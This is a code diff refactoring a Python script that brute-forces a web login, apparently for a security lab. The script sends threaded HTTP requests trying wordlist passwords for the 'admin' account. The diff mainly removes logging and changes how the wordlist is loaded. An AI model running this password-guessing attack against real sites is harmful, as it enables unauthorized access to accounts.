@@ -24,19 +24,11 @@ def print_answer(password: str, lock: Lock, stop_event: Event) -> None:
 
 
 def login_request(
-    ip: str,
-    username: str,
-    password: str,
-    lock: Lock,
-    stop_event: Event,
-    log_lock: Lock
+    ip: str, username: str, password: str, lock: Lock, stop_event: Event
 ) -> None:
     if stop_event.is_set():
         return
 
-    log_lock.acquire()
-    print("worker started")
-    log_lock.release()
     url = (
         f"http://{ip}/?page=signin&username={username}&password={password}&Login=Login"
     )
@@ -47,30 +39,29 @@ def login_request(
         print_answer(password, lock, stop_event)
 
 
-def load_wordlist(filename: str):
-    with open(filename, "r", encoding='utf-8', errors='ignore') as file:
-        for word in file:
-            yield word
+def load_wordlist(filename: str) -> list[str]:
+    content = open(filename, "r", encoding="utf-8", errors="ignore").read()
+    return content.splitlines()
 
 
-def multi_threading_brute(ip: str, filename: list):
+def multi_threading_brute(ip: str, filename: list) -> None:
     max_workers = 10
     lock = Lock()
     stop_event = Event()
-    log_lock = Lock()
     futures = set()
 
     with ThreadPoolExecutor(max_workers) as executor:
 
         for word in load_wordlist(filename):
             if stop_event.is_set():
-                break
+                exit(0)
             futures.add(
-                executor.submit(login_request, ip, "admin", word, lock, stop_event, log_lock)
+                executor.submit(login_request, ip, "admin", word, lock, stop_event)
             )
 
             if len(futures) >= max_workers:
                 wait(futures, return_when=FIRST_COMPLETED)
+
 
 if __name__ == "__main__":
     if len(argv) != 3:
